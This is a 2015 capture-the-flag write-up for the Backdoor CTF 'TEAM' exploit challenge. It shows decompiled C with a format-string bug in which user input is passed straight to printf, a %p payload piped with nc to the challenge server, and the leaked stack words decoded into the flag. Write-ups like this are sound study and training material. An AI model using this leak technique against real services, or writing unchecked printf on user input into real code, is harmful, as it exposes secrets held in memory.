---
layout: post
title: "Backdoor CTF 2015 - TEAM Writeup"
date: 2015-04-03 03:16:39 +0430
comments: false
categories: ctf backdoor exploit fmt leak
---

**Backdoor 2015 TEAM Writeup**  
**Point = 600**  
**Category = Exploit**  

> There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.

```
$ file team
team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
$ checksec.sh --file team
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team

```

Ok looking into the binary in IDA shows us two function `0x08048769` and `0x080486ad` are important to us. the first one can be seen bellow:
<!--more-->
```
int sub_8048769()
{
  const char *v0; // ST18_4@1
  const char *v1; // ST1C_4@1

  v0 = (const char *)malloc(0xC8u);
  v1 = (const char *)malloc(0x64u);
  printf("Enter teamname: ");
  fflush(stdout);
  __isoc99_scanf("%200s", v0);
  printf("Enter flag: ");
  fflush(stdout);
  __isoc99_scanf("%100s", v1);
  sleep(2u);
  sub_80486AD(v0, v1);
  free((void *)v0);
  free((void *)v1);
  return 0;
}
```
As you can see there is no potential flaw so we skip to second one:

```
signed int __cdecl sub_80486AD(const char *a1, const char *a2)
{
  signed int result; // eax@2
  int v3; // edx@7
  FILE *stream; // [sp+24h] [bp-74h]@1
  char s; // [sp+28h] [bp-70h]@3
  int v6; // [sp+8Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(&s, 100, stream);
    printf(a1);
    if ( !strcmp(&s, a2) )
      puts(" : correct flag!");
    else
      puts(" : incorrect flag. Try again.");
    fclose(stream);
    result = 0;
  }
  else
  {
    result = 1;
  }
  v3 = *MK_FP(__GS__, 20) ^ v6;
  return result;
}
```

interesting! in this function flag.txt will be opened and read but the important part is `printf(a1);`. remember previous function `a1` is the `v0` var which have the teamname! So there is a *Format String Vulnerability*. And the abuse is pretty simple, just printing the stack addresses to leak the flag:

```
$ cat 5
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
A

$ cat 5 | nc hack.bckdr.in 8004
Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.
```

you can see that 
```
0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137
```
is our flag. using python `struct` module for all gives us this one:

```
d3f5106d91e77a42be5805acd58a1b8dad11af78fcc5f381c2df5636953571fb
```

which added 600pts to our points.

HAMIDx9
